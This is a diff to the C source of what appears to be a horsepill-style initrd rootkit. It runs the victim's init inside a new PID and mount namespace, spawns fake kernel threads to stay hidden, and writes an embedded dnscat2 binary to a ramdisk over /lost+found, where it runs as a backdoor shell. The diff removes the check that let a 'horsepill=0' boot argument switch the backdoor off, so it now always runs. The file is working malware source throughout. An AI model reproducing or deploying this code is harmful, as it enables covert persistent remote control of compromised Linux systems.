@@ -20,7 +20,7 @@
 #include "dnscat.h"
 #include "banner.h"
 
-#define DNSCAT_PATH        "/lost+found/dnscat"
+#define DNSCAT_PATH	"/lost+found/dnscat"
 
 #ifndef MS_RELATIME
 #define MS_RELATIME     (1<<21)
@@ -140,9 +140,10 @@ static void grab_kernel_threads(char **threads)
 	(void) closedir(dirp);
 }
 
-/* stolen from
- * https://github.com/lxc/lxc/blob/master/src/lxc/utils.c#L1572
- */
+/** 
+ * Start section stolen from https://github.com/lxc/lxc/blob/master/src/lxc/utils.c#L1572
+ **/
+
 static int setproctitle(char *title)
 {
 	static char *proctitle = NULL;
@@ -268,95 +269,55 @@ static void set_prctl_name(char *name)
 	}
 }
 
+/** 
+ * End section stolen from https://github.com/lxc/lxc/blob/master/src/lxc/utils.c#L1572
+ **/
+
 static void make_kernel_threads(char **threads)
 {
 	int i;
 	if (fork() == 0) {
-		/* special case for pid 2 (kthreadd) */
-
+		// special case for pid 2 (kthreadd)
 		set_prctl_name(threads[0]);
 		setproctitle(threads[0]);
+
 		for (i = 1; threads[i]; i++) {
 			if (fork() == 0) {
-				/* all other kernel threads are
-				 * children of pid 2
-				 */
+				// all other kernel threads are children of pid 2
 				set_prctl_name(threads[i]);
 				setproctitle(threads[i]);
-				while(1) {
+
+				while(1)
 					pause();
-				}
-				exit(EXIT_FAILURE); /* should never
-						     * reach here */
+
+				exit(EXIT_FAILURE); // should never reach here
 			}
-			//sleep(1);
 		}
-		while(1) {
+
+		while(1)
 			pause();
-		}
-		exit(EXIT_FAILURE); /* should never reach here */
+		
+		exit(EXIT_FAILURE); // should never reach here
 	}
 }
 
-int should_backdoor()
-{
-	const char* procs[] = { "/proc/cmdline", "/root/proc/cmdline", NULL };
-	static int known = -1;
-	int fd;
-	int rc;
-	char *buf[4096];
-
-	if (known != -1) {
-		goto out;
-	}
-	
-	memset((void*)buf, 0, sizeof(buf));
-
-	for (int i = 0; procs[i]; i++) {
-
-		fd = open(procs[i], O_RDONLY);
-		if (fd < 0) {
-			continue;
-		}
-	}
-	if (fd < 0) {
-		/* we couldn't open a command line */
-		printf("couldn't opne /proc/cmdline");
-		sleep(10);
-		goto no;
-	}
-	rc = read(fd, (void*)buf, sizeof(buf));
-	close(fd);
-	if (rc < 0) {
-		printf("error reading /proc/cmdline");
-		sleep(10);
-		goto no;
-	}
-
-	if (strstr(buf, "horsepill=0")) 
-		goto no;
-
- yes:	
-	known = 1;
-	goto out;
- no:
-	known = 0;
- out:
-	return known;
-}
-
-/* shoves dnscat2 executable into our ramdisk */
+/**
+ * This function writes dnscat2 executable into ramdisk
+ **/
 static void write_dnscat2()
 {
 	FILE* exe_file = NULL;
 	exe_file = fopen(DNSCAT_PATH, "w+");
 	if (exe_file) {
-		(void)fwrite((const void*)dnscat, 1, dnscat_len, exe_file);
-		(void)fclose(exe_file);
-		(void)chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
+		fwrite((const void*)dnscat, 1, dnscat_len, exe_file);
+		fclose(exe_file);
+		chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
 	}
 }
 
+/**
+ * This function run dnscat2 process
+ **/
 static pid_t run_dnscat2()
 {
 	pid_t pid;
@@ -398,118 +359,85 @@ static pid_t run_dnscat2()
 		YOLO(open("/dev/null", O_RDWR));
 
 		execv(DNSCAT_PATH, argv);
-		printf("couldn't run dnscat!\n");
 		exit(EXIT_FAILURE);
 	}
 	return pid;
 }
 
+/**
+ * This function handles the exit of init process
+ **/
 static void handle_init_exit(int status)
 {
-	/* printf("child init exited with status: %d\n", WEXITSTATUS(status)); */
-	if (WIFSIGNALED(status)) {
-		int signum = WTERMSIG(status);
-
-		if (signum == 1) {
-			/* printf("\n\n\nabout to reboot!\n"); sleep(2); */
-
-			(void)reboot(LINUX_REBOOT_CMD_RESTART, NULL);
-			printf("cannot reboot!\n");
-			exit(EXIT_FAILURE);
-		} else if (signum == 2) {
-			/* printf("\n\n\nabout to shutdown!\n"); sleep(2); */
-			YOLO(reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL));
-			printf("cannot shutdown!\n");
-			exit(EXIT_FAILURE);
-
-		} else {
-			printf("init exited via signal %d for unknown reason\n", signum);
-			exit(EXIT_FAILURE);
-		}
-	} else {
-		printf("init exited with status %d for unknown reason\n", WEXITSTATUS(status));
-		printf("child init termination caused by signal %d\n", WTERMSIG(status));
+	// init exited for unknown reason
+	if (!WIFSIGNALED(status))
 		exit(EXIT_FAILURE);
-	}
-	printf("child init termination caused by signal %d\n",
-	       WTERMSIG(status));
+	
+	int signum = WTERMSIG(status);
+
+	if (signum == 1) // cannot reboot
+		reboot(LINUX_REBOOT_CMD_RESTART, NULL);
+	else if (signum == 2) // cannot shutdown
+		reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL);
+	
 	exit(EXIT_FAILURE);
 }
 
 static void on_sigint(int signum)
 {
-	/* printf("got signal %d\n", signum); */
-	if (signum == SIGINT) {
-	  kill(init_pid, SIGINT);
-	}
+	if (signum == SIGINT)
+		kill(init_pid, SIGINT);
 }
 
-/* entry point just prior to running init */
+/**
+ * This function is entry point just prior to running init
+ **/
 void perform_hacks()
 {
-	char *kthreads[1024]; /* you prolly don't have more than 1024 */
+	char *kthreads[1024];
 
-	if (!should_backdoor()) {
-		return;
-	}
+	// enumerate kernel threads
 	memset((void*)kthreads, 0, sizeof(kthreads));
 	grab_kernel_threads(kthreads);
+	
+	// clone(CLONE_NEWPID, CLONE_NEWNS)
 	init_pid = raw_clone(SIGCHLD | CLONE_NEWPID | CLONE_NEWNS, NULL);
-	if (init_pid < 0) {
-		printf("could not clone!\n");
+	if (init_pid < 0)
 		exit(EXIT_FAILURE);
-	} else if (init_pid > 0) {
-		/* parent process - the real init.  DOES NOT EXIT */
-		pid_t dnscat_pid, reinfect_pid;
+	
+	if (init_pid > 0) { // parent process - the real init
+		pid_t dnscat_pid;
 
-		/* plop a ramdisk over lost+found for our use */
-		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0) {
-			printf("couldn't mount ramdisk!\n");
+		// mount scratch space
+		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0)
 			exit(EXIT_FAILURE);
-		}
 
-		/* install signal handler to handle signal delivered
-		 * ctrl-alt-delete, which we will send to child init
-		 */
-		if (signal(SIGINT, on_sigint) == SIG_ERR) {
-		  printf("couldn't installl signal handler\n");
-		}
-		if (reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL) < 0) {
-		  printf("couldn't turn cad off\n");
-		}
+		// install signal handler to handle signal delivered ctrl-alt-delete, which we will send to child init
+		signal(SIGINT, on_sigint);
+		reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL);
 
-		/* wait for things to come up and networking to be
-		 * ready
-		 */
+		// wait for things to come up and networking to be ready
 		sleep(20);
 
-		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,
-			  "errors=remount-ro,data=ordered") < 0) {
-			printf("couldnt remount /\n");
+		// remount root
+		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME, "errors=remount-ro,data=ordered") < 0)
 			exit(EXIT_FAILURE);
-		}
 
-		/* spawn a process for backdoor shell */
+		// write executable of dnscat2
 		write_dnscat2();
+		
+		// spawn a process for backdoor shell
 		dnscat_pid = run_dnscat2();
 
-		/* watching for dnscat exit
-		 * also, watching for reinfection
-		 * also, waitpid for init
-		 */
+		// watching for dnscat exit, watching for reinfection and waitpid for init
 		while(1) {
 			int status;
 			pid_t pid;
 
 			pid = waitpid(-1, &status, 0);
 			if (pid < 0) {
-				if (errno != EINTR) {
-					printf("watipid returned error!\n");
+				if (errno != EINTR) // if not interrupted via signal
 					exit(EXIT_FAILURE);
-				} else {
-					/* interrupted via signal */
-					continue;
-				}
 			} else if (pid == init_pid) {
 				handle_init_exit(status);
 			} else if (pid == dnscat_pid) {
@@ -519,21 +447,14 @@ void perform_hacks()
 			}
 			sleep(1);
 		}
-
-	} else {
-		/* child process - this process will run the victim init */
-		const int mountflags = MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME;
-
-		/* we need to remount proc b/c we have the parent namespace's view */
-		if (umount("/proc") < 0) {
-			printf("couldn't umount /proc\n");
+	} else { // child process - this process will run the victim init
+		// remount /proc
+		if (umount("/proc") < 0)
 			exit(EXIT_FAILURE);
-		}
-		if (mount("proc", "/proc", "proc", mountflags, NULL) < 0) {
-			printf("could not remount proc\n");
+		if (mount("proc", "/proc", "proc", MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME, NULL) < 0)
 			exit(EXIT_FAILURE);
-		}
+		
+		// make fake kernel threads
 		make_kernel_threads(kthreads);
 	}
 }
-/* end hacks */
